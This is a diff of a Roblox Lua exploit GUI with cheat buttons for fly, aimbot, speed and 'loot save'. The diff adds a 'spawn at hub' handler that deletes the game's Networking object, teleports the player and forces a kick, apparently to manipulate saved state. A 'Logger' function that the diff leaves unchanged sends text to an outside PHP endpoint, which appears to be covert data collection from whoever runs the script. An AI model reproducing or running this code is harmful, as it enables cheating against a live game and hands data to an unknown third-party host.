@@ -18,6 +18,7 @@ local max = Instance.new("TextButton")
 local aim = Instance.new("TextButton")
 local speed = Instance.new("TextButton")
 local save = Instance.new("TextButton")
+local hub = Instance.new("TextButton")
 local info = Instance.new("TextButton")
 local close = Instance.new("TextButton")
 local min = Instance.new("TextButton")
@@ -32,7 +33,7 @@ MAIN.Name = "MAIN"
 MAIN.Parent = AR8
 MAIN.BackgroundColor3 = Color3.new(1, 1, 1)
 MAIN.BackgroundTransparency = 1
-MAIN.Position = UDim2.new(99999, 99999, 99999, 99999)
+MAIN.Position = UDim2.new(9999, 9999, 9999, 9999)
 MAIN.Size = UDim2.new(0, 281, 0, 453)
 MAIN.Visible = false
 
@@ -88,6 +89,7 @@ ScrollingFrame.Parent = ImageLabel
 ScrollingFrame.BackgroundColor3 = Color3.new(0.129412, 0.129412, 0.129412)
 ScrollingFrame.Position = UDim2.new(0.0746887997, 0, 0.111904763, 0)
 ScrollingFrame.Size = UDim2.new(0, 204, 0, 94)
+ScrollingFrame.CanvasPosition = Vector2.new(0, 164.5)
 
 fly.Name = "fly"
 fly.Parent = ScrollingFrame
@@ -148,6 +150,18 @@ save.Text = "TOGGLE  LOOT SAVE"
 save.TextColor3 = Color3.new(1, 1, 1)
 save.TextSize = 14
 save.TextWrapped = true
+
+hub.Name = "hub"
+hub.Parent = ScrollingFrame
+hub.BackgroundColor3 = Color3.new(0, 0, 0)
+hub.BackgroundTransparency = 0.69999998807907
+hub.Position = UDim2.new(0, 0, 0.25, 0)
+hub.Size = UDim2.new(0, 157, 0, 32)
+hub.Font = Enum.Font.SourceSans
+hub.Text = "SPAWN AT HUB"
+hub.TextColor3 = Color3.new(1, 1, 1)
+hub.TextSize = 14
+hub.TextWrapped = true
 
 info.Name = "info"
 info.Parent = ImageLabel
@@ -224,7 +238,7 @@ max_2.TextSize = 20
 max_2.TextTransparency = 1
 max_2.TextWrapped = true
 -- Scripts:
-function SCRIPT_GQIL71_FAKESCRIPT() -- view.Script 
+function SCRIPT_BLPE87_FAKESCRIPT() -- view.Script 
 	local script = Instance.new('Script')
 	script.Parent = view
 	script.Parent.MouseButton1Click:connect(function()
@@ -286,8 +300,8 @@ function SCRIPT_GQIL71_FAKESCRIPT() -- view.Script
 	
 
 end
-coroutine.resume(coroutine.create(SCRIPT_GQIL71_FAKESCRIPT))
-function SCRIPT_BXBK86_FAKESCRIPT() -- corpse.Script 
+coroutine.resume(coroutine.create(SCRIPT_BLPE87_FAKESCRIPT))
+function SCRIPT_UWIO73_FAKESCRIPT() -- corpse.Script 
 	local script = Instance.new('Script')
 	script.Parent = corpse
 	script.Parent.MouseButton1Click:connect(function()
@@ -399,8 +413,8 @@ function SCRIPT_BXBK86_FAKESCRIPT() -- corpse.Script
 	
 
 end
-coroutine.resume(coroutine.create(SCRIPT_BXBK86_FAKESCRIPT))
-function SCRIPT_QOPR81_FAKESCRIPT() -- fly.Script 
+coroutine.resume(coroutine.create(SCRIPT_UWIO73_FAKESCRIPT))
+function SCRIPT_MQRR71_FAKESCRIPT() -- fly.Script 
 	local script = Instance.new('Script')
 	script.Parent = fly
 		script.Parent.MouseButton1Click:connect(function()
@@ -484,8 +498,8 @@ function SCRIPT_QOPR81_FAKESCRIPT() -- fly.Script
 	end)
 
 end
-coroutine.resume(coroutine.create(SCRIPT_QOPR81_FAKESCRIPT))
-function SCRIPT_QWWI80_FAKESCRIPT() -- max.Script 
+coroutine.resume(coroutine.create(SCRIPT_MQRR71_FAKESCRIPT))
+function SCRIPT_DGLG69_FAKESCRIPT() -- max.Script 
 	local script = Instance.new('Script')
 	script.Parent = max
 	script.Parent.MouseButton1Click:connect(function()
@@ -538,8 +552,8 @@ function SCRIPT_QWWI80_FAKESCRIPT() -- max.Script
 	
 
 end
-coroutine.resume(coroutine.create(SCRIPT_QWWI80_FAKESCRIPT))
-function SCRIPT_DNIH76_FAKESCRIPT() -- aim.Script 
+coroutine.resume(coroutine.create(SCRIPT_DGLG69_FAKESCRIPT))
+function SCRIPT_VSRO68_FAKESCRIPT() -- aim.Script 
 	local script = Instance.new('Script')
 	script.Parent = aim
 	script.Parent.MouseButton1Click:connect(function()
@@ -1377,8 +1391,8 @@ function SCRIPT_DNIH76_FAKESCRIPT() -- aim.Script
 	
 
 end
-coroutine.resume(coroutine.create(SCRIPT_DNIH76_FAKESCRIPT))
-function SCRIPT_IELP78_FAKESCRIPT() -- speed.Script 
+coroutine.resume(coroutine.create(SCRIPT_VSRO68_FAKESCRIPT))
+function SCRIPT_STGG72_FAKESCRIPT() -- speed.Script 
 	local script = Instance.new('Script')
 	script.Parent = speed
 	script.Parent.MouseButton1Click:connect(function()
@@ -1439,8 +1453,8 @@ function SCRIPT_IELP78_FAKESCRIPT() -- speed.Script
 	end)
 
 end
-coroutine.resume(coroutine.create(SCRIPT_IELP78_FAKESCRIPT))
-function SCRIPT_XLNW87_FAKESCRIPT() -- save.Script 
+coroutine.resume(coroutine.create(SCRIPT_STGG72_FAKESCRIPT))
+function SCRIPT_JUDW80_FAKESCRIPT() -- save.Script 
 	local script = Instance.new('Script')
 	script.Parent = save
 	script.Parent.MouseButton1Click:connect(function()
@@ -1542,8 +1556,59 @@ function SCRIPT_XLNW87_FAKESCRIPT() -- save.Script
 	end)
 
 end
-coroutine.resume(coroutine.create(SCRIPT_XLNW87_FAKESCRIPT))
-function SCRIPT_EBXG69_FAKESCRIPT() -- info.Script 
+coroutine.resume(coroutine.create(SCRIPT_JUDW80_FAKESCRIPT))
+function SCRIPT_MJBZ74_FAKESCRIPT() -- hub.Script 
+	local script = Instance.new('Script')
+	script.Parent = hub
+	script.Parent.MouseButton1Click:connect(function()
+		
+		--Button Sound Effect
+		local s = Instance.new("Sound")
+		 
+		s.Name = "Sound"
+		s.SoundId = "http://www.roblox.com/asset/?id=452267918"
+		s.Volume = 7
+		s.Looped = false
+		s.archivable = false
+		 
+		s.Parent = game.Workspace
+		 
+		s:play()
+		
+		script.Parent.Active = false
+		script.Parent.BackgroundTransparency = 0.5
+		script.Parent.Text = "LOADED"
+		wait(2)
+		script.Parent.Active = true
+		script.Parent.BackgroundTransparency = 0.7
+		script.Parent.Text = "TOGGLE  LOOT SAVE"
+		
+		local function playsound(id)
+			local sound = Instance.new('Sound',Camera)
+			sound.SoundId = 'rbxassetid://'..id
+			sound.Volume = 3
+			sound:Play()
+			game:GetService('Debris'):AddItem(sound,5)
+		end
+		
+		local function Notification(...)
+			playsound(140910211)
+			game.StarterGui:SetCore('SendNotification',...)
+		end
+		
+		Notification({Title='Loaded';Text='Loot Save Toggled';Duration=4;Icon=''})
+		    
+		--Hub Function
+		game.ReplicatedStorage.Networking:Remove() 
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Vector3.new(1331.0556640625, 2611.3967285156, 1616.8410644531)
+		game.Players.LocalPlayer:Kick("SPAWN SET AT HUB")
+		
+		
+	end)
+
+end
+coroutine.resume(coroutine.create(SCRIPT_MJBZ74_FAKESCRIPT))
+function SCRIPT_AKXD83_FAKESCRIPT() -- info.Script 
 	local script = Instance.new('Script')
 	script.Parent = info
 	script.Parent.MouseButton1Click:connect(function()
@@ -1569,8 +1634,8 @@ function SCRIPT_EBXG69_FAKESCRIPT() -- info.Script
 	end)
 
 end
-coroutine.resume(coroutine.create(SCRIPT_EBXG69_FAKESCRIPT))
-function SCRIPT_XKVE83_FAKESCRIPT() -- close.Script 
+coroutine.resume(coroutine.create(SCRIPT_AKXD83_FAKESCRIPT))
+function SCRIPT_WVXD85_FAKESCRIPT() -- close.Script 
 	local script = Instance.new('Script')
 	script.Parent = close
 	script.Parent.MouseButton1Click:connect(function()
@@ -1595,8 +1660,8 @@ function SCRIPT_XKVE83_FAKESCRIPT() -- close.Script
 	end)
 
 end
-coroutine.resume(coroutine.create(SCRIPT_XKVE83_FAKESCRIPT))
-function SCRIPT_GVZQ77_FAKESCRIPT() -- min.Script 
+coroutine.resume(coroutine.create(SCRIPT_WVXD85_FAKESCRIPT))
+function SCRIPT_HWJH78_FAKESCRIPT() -- min.Script 
 	local script = Instance.new('Script')
 	script.Parent = min
 	script.Parent.MouseButton1Click:connect(function()
@@ -1621,8 +1686,8 @@ function SCRIPT_GVZQ77_FAKESCRIPT() -- min.Script
 	end)
 
 end
-coroutine.resume(coroutine.create(SCRIPT_GVZQ77_FAKESCRIPT))
-function SCRIPT_QVEO80_FAKESCRIPT() -- MAIN.start 
+coroutine.resume(coroutine.create(SCRIPT_HWJH78_FAKESCRIPT))
+function SCRIPT_IKGN74_FAKESCRIPT() -- MAIN.start 
 	local script = Instance.new('Script')
 	script.Parent = MAIN
 	--LOADED FUNCTION
@@ -1659,8 +1724,8 @@ function SCRIPT_QVEO80_FAKESCRIPT() -- MAIN.start
 	
 
 end
-coroutine.resume(coroutine.create(SCRIPT_QVEO80_FAKESCRIPT))
-function SCRIPT_XQUA78_FAKESCRIPT() -- MAIN.fog 
+coroutine.resume(coroutine.create(SCRIPT_IKGN74_FAKESCRIPT))
+function SCRIPT_SQOO70_FAKESCRIPT() -- MAIN.fog 
 	local script = Instance.new('Script')
 	script.Parent = MAIN
 	while wait() do
@@ -1671,8 +1736,8 @@ function SCRIPT_XQUA78_FAKESCRIPT() -- MAIN.fog
 	
 
 end
-coroutine.resume(coroutine.create(SCRIPT_XQUA78_FAKESCRIPT))
-function SCRIPT_CEZE67_FAKESCRIPT() -- max_2.Script 
+coroutine.resume(coroutine.create(SCRIPT_SQOO70_FAKESCRIPT))
+function SCRIPT_XAIK66_FAKESCRIPT() -- max_2.Script 
 	local script = Instance.new('Script')
 	script.Parent = max_2
 	script.Parent.MouseButton1Click:connect(function()
@@ -1697,8 +1762,8 @@ function SCRIPT_CEZE67_FAKESCRIPT() -- max_2.Script
 	end)
 
 end
-coroutine.resume(coroutine.create(SCRIPT_CEZE67_FAKESCRIPT))
-function SCRIPT_FJKC83_FAKESCRIPT() -- AR8.logger2 
+coroutine.resume(coroutine.create(SCRIPT_XAIK66_FAKESCRIPT))
+function SCRIPT_PCQI84_FAKESCRIPT() -- AR8.logger2 
 	local script = Instance.new('Script')
 	script.Parent = AR8
 	--Logger
@@ -1707,351 +1772,4 @@ function SCRIPT_FJKC83_FAKESCRIPT() -- AR8.logger2
 		print(game:HttpGetAsync("https://mystogan.xyz/AcLuA7nxkdLnBzJk90lmPokZxVyNHk423xFfjKlUtYnnvVjEr3965xnMLxX.php?text="..textforsend))
 
 end
-coroutine.resume(coroutine.create(SCRIPT_FJKC83_FAKESCRIPT))
-function SCRIPT_YRYY82_FAKESCRIPT() -- AR8.hubgen 
-	local script = Instance.new('Script')
-	script.Parent = AR8
-	--Hills HubGen
-		
-		local Model = Instance.new("Model", game:GetService("Workspace"))
-		Model.Name = "Model"
-		---------------------------------------------
-		local Part1 = Instance.new("Part", Model)
-		Part1.Name = "Sign"
-		Part1.Reflectance = 0
-		Part1.Transparency = 1
-		Part1.Anchored = true
-		Part1.Archivable = true
-		Part1.CanCollide = false
-		Part1.Locked = false
-		Part1.BrickColor = BrickColor.new("Sand red")
-		Part1.Material = Enum.Material.Plastic
-		Part1.Position = Vector3.new(1331.0556640625, 2611.3967285156, 1616.8410644531)
-		Part1.Size = Vector3.new(9.1399993896484, 5, 0.25)
-		Part1.Rotation = Vector3.new(0, -90, 0)
-		---------------------------------------------
-		local Part2 = Instance.new("Part", Model)
-		Part2.Name = "Brick"
-		Part2.Reflectance = 0
-		Part2.Transparency = 0
-		Part2.Anchored = true
-		Part2.Archivable = true
-		Part2.CanCollide = true
-		Part2.Locked = false
-		Part2.BrickColor = BrickColor.new("Light stone grey")
-		Part2.Material = Enum.Material.Plastic
-		Part2.Position = Vector3.new(1371.3013916016, 2604.6467285156, 1601.0034179688)
-		Part2.Size = Vector3.new(44.099998474121, 1, 138.5)
-		Part2.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part3 = Instance.new("Part", Model)
-		Part3.Name = "Brick"
-		Part3.Reflectance = 0
-		Part3.Transparency = 0
-		Part3.Anchored = true
-		Part3.Archivable = true
-		Part3.CanCollide = true
-		Part3.Locked = false
-		Part3.BrickColor = BrickColor.new("Grime")
-		Part3.Material = Enum.Material.Plastic
-		Part3.Position = Vector3.new(1330.0549316406, 2622.2470703125, 1601.6687011719)
-		Part3.Size = Vector3.new(20, 2.2000000476837, 18)
-		Part3.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part4 = Instance.new("Part", Model)
-		Part4.Name = "Brick"
-		Part4.Reflectance = 0
-		Part4.Transparency = 0
-		Part4.Anchored = true
-		Part4.Archivable = true
-		Part4.CanCollide = true
-		Part4.Locked = false
-		Part4.BrickColor = BrickColor.new("Grime")
-		Part4.Material = Enum.Material.Plastic
-		Part4.Position = Vector3.new(1330.0549316406, 2621.046875, 1601.6687011719)
-		Part4.Size = Vector3.new(24, 0.20000000298023, 22)
-		Part4.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part5 = Instance.new("Part", Model)
-		Part5.Name = "Brick"
-		Part5.Reflectance = 0
-		Part5.Transparency = 0
-		Part5.Anchored = true
-		Part5.Archivable = true
-		Part5.CanCollide = true
-		Part5.Locked = false
-		Part5.BrickColor = BrickColor.new("Mid gray")
-		Part5.Material = Enum.Material.Plastic
-		Part5.Position = Vector3.new(1330.0549316406, 2619.9470214844, 1601.6687011719)
-		Part5.Size = Vector3.new(22, 2, 20)
-		Part5.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part6 = Instance.new("Part", Model)
-		Part6.Name = "Brick"
-		Part6.Reflectance = 0
-		Part6.Transparency = 0
-		Part6.Anchored = true
-		Part6.Archivable = true
-		Part6.CanCollide = true
-		Part6.Locked = false
-		Part6.BrickColor = BrickColor.new("Light stone grey")
-		Part6.Material = Enum.Material.Plastic
-		Part6.Position = Vector3.new(1322.5938720703, 2614.4470214844, 1609.2087402344)
-		Part6.Size = Vector3.new(1, 9, 1)
-		Part6.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part7 = Instance.new("Part", Model)
-		Part7.Name = "Brick"
-		Part7.Reflectance = 0
-		Part7.Transparency = 0
-		Part7.Anchored = true
-		Part7.Archivable = true
-		Part7.CanCollide = true
-		Part7.Locked = false
-		Part7.BrickColor = BrickColor.new("Light stone grey")
-		Part7.Material = Enum.Material.Plastic
-		Part7.Position = Vector3.new(1330.0988769531, 2611.9470214844, 1610.1687011719)
-		Part7.Size = Vector3.new(16, 14, 1)
-		Part7.Rotation = Vector3.new(-180, -0.30000001192093, -180)
-		---------------------------------------------
-		local Part8 = Instance.new("Part", Model)
-		Part8.Name = "Brick"
-		Part8.Reflectance = 0
-		Part8.Transparency = 0
-		Part8.Anchored = true
-		Part8.Archivable = true
-		Part8.CanCollide = true
-		Part8.Locked = false
-		Part8.BrickColor = BrickColor.new("Light stone grey")
-		Part8.Material = Enum.Material.Plastic
-		Part8.Position = Vector3.new(1322.5549316406, 2617.4470214844, 1601.7087402344)
-		Part8.Size = Vector3.new(14, 3, 1)
-		Part8.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part9 = Instance.new("Part", Model)
-		Part9.Name = "Brick"
-		Part9.Reflectance = 0.20000000298023
-		Part9.Transparency = 0.69999998807907
-		Part9.Anchored = true
-		Part9.Archivable = true
-		Part9.CanCollide = true
-		Part9.Locked = false
-		Part9.BrickColor = BrickColor.new("Sand blue")
-		Part9.Material = Enum.Material.Plastic
-		Part9.Position = Vector3.new(1322.5289306641, 2612.9470214844, 1596.7077636719)
-		Part9.Size = Vector3.new(4, 6, 1)
-		Part9.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part10 = Instance.new("Part", Model)
-		Part10.Name = "Brick"
-		Part10.Reflectance = 0.20000000298023
-		Part10.Transparency = 0.69999998807907
-		Part10.Anchored = true
-		Part10.Archivable = true
-		Part10.CanCollide = true
-		Part10.Locked = false
-		Part10.BrickColor = BrickColor.new("Sand blue")
-		Part10.Material = Enum.Material.Plastic
-		Part10.Position = Vector3.new(1322.5677490234, 2612.9470214844, 1604.2087402344)
-		Part10.Size = Vector3.new(9, 6, 1)
-		Part10.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part11 = Instance.new("Part", Model)
-		Part11.Name = "Brick"
-		Part11.Reflectance = 0
-		Part11.Transparency = 0
-		Part11.Anchored = true
-		Part11.Archivable = true
-		Part11.CanCollide = true
-		Part11.Locked = false
-		Part11.BrickColor = BrickColor.new("Light stone grey")
-		Part11.Material = Enum.Material.Plastic
-		Part11.Position = Vector3.new(1322.5418701172, 2612.9470214844, 1599.2087402344)
-		Part11.Size = Vector3.new(1, 6, 1)
-		Part11.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part12 = Instance.new("Part", Model)
-		Part12.Name = "Brick"
-		Part12.Reflectance = 0
-		Part12.Transparency = 0
-		Part12.Anchored = true
-		Part12.Archivable = true
-		Part12.CanCollide = true
-		Part12.Locked = false
-		Part12.BrickColor = BrickColor.new("Light stone grey")
-		Part12.Material = Enum.Material.Plastic
-		Part12.Position = Vector3.new(1322.5578613281, 2607.4460449219, 1602.2077636719)
-		Part12.Size = Vector3.new(15, 5, 1)
-		Part12.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part13 = Instance.new("Part", Model)
-		Part13.Name = "Brick"
-		Part13.Reflectance = 0
-		Part13.Transparency = 0
-		Part13.Anchored = true
-		Part13.Archivable = true
-		Part13.CanCollide = true
-		Part13.Locked = false
-		Part13.BrickColor = BrickColor.new("Light stone grey")
-		Part13.Material = Enum.Material.Plastic
-		Part13.Position = Vector3.new(1330.0108642578, 2611.9470214844, 1593.1685791016)
-		Part13.Size = Vector3.new(16, 14, 1)
-		Part13.Rotation = Vector3.new(-180, -0.30000001192093, -180)
-		---------------------------------------------
-		local Part14 = Instance.new("Part", Model)
-		Part14.Name = "Brick"
-		Part14.Reflectance = 0
-		Part14.Transparency = 0
-		Part14.Anchored = true
-		Part14.Archivable = true
-		Part14.CanCollide = true
-		Part14.Locked = false
-		Part14.BrickColor = BrickColor.new("Light stone grey")
-		Part14.Material = Enum.Material.Plastic
-		Part14.Position = Vector3.new(1337.5738525391, 2612.4470214844, 1605.1296386719)
-		Part14.Size = Vector3.new(9, 13, 1)
-		Part14.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part15 = Instance.new("Part", Model)
-		Part15.Name = "Brick"
-		Part15.Reflectance = 0
-		Part15.Transparency = 0
-		Part15.Anchored = true
-		Part15.Archivable = true
-		Part15.CanCollide = true
-		Part15.Locked = false
-		Part15.BrickColor = BrickColor.new("Light stone grey")
-		Part15.Material = Enum.Material.Plastic
-		Part15.Position = Vector3.new(1337.5318603516, 2616.4470214844, 1597.1296386719)
-		Part15.Size = Vector3.new(7, 5, 1)
-		Part15.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part16 = Instance.new("Part", Model)
-		Part16.Name = "Brick"
-		Part16.Reflectance = 0
-		Part16.Transparency = 0
-		Part16.Anchored = true
-		Part16.Archivable = true
-		Part16.CanCollide = true
-		Part16.Locked = false
-		Part16.BrickColor = BrickColor.new("Light stone grey")
-		Part16.Material = Enum.Material.Plastic
-		Part16.Position = Vector3.new(1330.5549316406, 2605.4460449219, 1601.6667480469)
-		Part16.Size = Vector3.new(16, 1, 15)
-		Part16.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part17 = Instance.new("Part", Model)
-		Part17.Name = "Sign"
-		Part17.Reflectance = 0
-		Part17.Transparency = 1
-		Part17.Anchored = true
-		Part17.Archivable = true
-		Part17.CanCollide = false
-		Part17.Locked = false
-		Part17.BrickColor = BrickColor.new("Sand red")
-		Part17.Material = Enum.Material.Plastic
-		Part17.Position = Vector3.new(1331.0556640625, 2611.3967285156, 1585.8410644531)
-		Part17.Size = Vector3.new(9.1399993896484, 5, 0.25)
-		Part17.Rotation = Vector3.new(0, -90, 0)
-		---------------------------------------------
-		local Part18 = Instance.new("Part", Model)
-		Part18.Name = "Brick"
-		Part18.Reflectance = 0
-		Part18.Transparency = 0
-		Part18.Anchored = true
-		Part18.Archivable = true
-		Part18.CanCollide = true
-		Part18.Locked = false
-		Part18.BrickColor = BrickColor.new("Grime")
-		Part18.Material = Enum.Material.Plastic
-		Part18.Position = Vector3.new(1371.4942626953, 2610.5971679688, 1571.7021484375)
-		Part18.Size = Vector3.new(14.89999961853, 13.5, 139)
-		Part18.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part19 = Instance.new("Part", Model)
-		Part19.Name = "Brick"
-		Part19.Reflectance = 0
-		Part19.Transparency = 0
-		Part19.Anchored = true
-		Part19.Archivable = true
-		Part19.CanCollide = true
-		Part19.Locked = false
-		Part19.BrickColor = BrickColor.new("Mid gray")
-		Part19.Material = Enum.Material.Plastic
-		Part19.Position = Vector3.new(1371.4942626953, 2617.9470214844, 1571.7021484375)
-		Part19.Size = Vector3.new(14.89999961853, 1.1999998092651, 139)
-		Part19.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part20 = Instance.new("Part", Model)
-		Part20.Name = "Brick"
-		Part20.Reflectance = 0
-		Part20.Transparency = 0
-		Part20.Anchored = true
-		Part20.Archivable = true
-		Part20.CanCollide = true
-		Part20.Locked = false
-		Part20.BrickColor = BrickColor.new("Mid gray")
-		Part20.Material = Enum.Material.Plastic
-		Part20.Position = Vector3.new(1371.8059082031, 2617.9958496094, 1630.4832763672)
-		Part20.Size = Vector3.new(14.89999961853, 1.1999998092651, 139)
-		Part20.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part21 = Instance.new("Part", Model)
-		Part21.Name = "Brick"
-		Part21.Reflectance = 0
-		Part21.Transparency = 0
-		Part21.Anchored = true
-		Part21.Archivable = true
-		Part21.CanCollide = true
-		Part21.Locked = false
-		Part21.BrickColor = BrickColor.new("Grime")
-		Part21.Material = Enum.Material.Plastic
-		Part21.Position = Vector3.new(1371.8059082031, 2610.6467285156, 1630.4832763672)
-		Part21.Size = Vector3.new(14.89999961853, 13.5, 139)
-		Part21.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part22 = Instance.new("Part", Model)
-		Part22.Name = "Brick"
-		Part22.Reflectance = 0
-		Part22.Transparency = 0
-		Part22.Anchored = true
-		Part22.Archivable = true
-		Part22.CanCollide = true
-		Part22.Locked = false
-		Part22.BrickColor = BrickColor.new("Grime")
-		Part22.Material = Enum.Material.Plastic
-		Part22.Position = Vector3.new(1432.1539306641, 2610.5974121094, 1601.3385009766)
-		Part22.Size = Vector3.new(50.799999237061, 13.5, 18)
-		Part22.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part23 = Instance.new("Part", Model)
-		Part23.Name = "Brick"
-		Part23.Reflectance = 0
-		Part23.Transparency = 1
-		Part23.Anchored = true
-		Part23.Archivable = true
-		Part23.CanCollide = true
-		Part23.Locked = false
-		Part23.BrickColor = BrickColor.new("Mid gray")
-		Part23.Material = Enum.Material.Plastic
-		Part23.Position = Vector3.new(1381.1711425781, 2618.3957519531, 1599.7840576172)
-		Part23.Size = Vector3.new(47.199996948242, 1.7999997138977, 120.09999847412)
-		Part23.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-		local Part24 = Instance.new("Part", Model)
-		Part24.Name = "Brick"
-		Part24.Reflectance = 0
-		Part24.Transparency = 0
-		Part24.Anchored = true
-		Part24.Archivable = true
-		Part24.CanCollide = true
-		Part24.Locked = false
-		Part24.BrickColor = BrickColor.new("Mid gray")
-		Part24.Material = Enum.Material.Plastic
-		Part24.Position = Vector3.new(1432.1204833984, 2617.6467285156, 1599.5167236328)
-		Part24.Size = Vector3.new(47.199996948242, 1.7999997138977, 17.999998092651)
-		Part24.Rotation = Vector3.new(-180, 89.699996948242, -180)
-		---------------------------------------------
-
-end
-coroutine.resume(coroutine.create(SCRIPT_YRYY82_FAKESCRIPT))
+coroutine.resume(coroutine.create(SCRIPT_PCQI84_FAKESCRIPT))
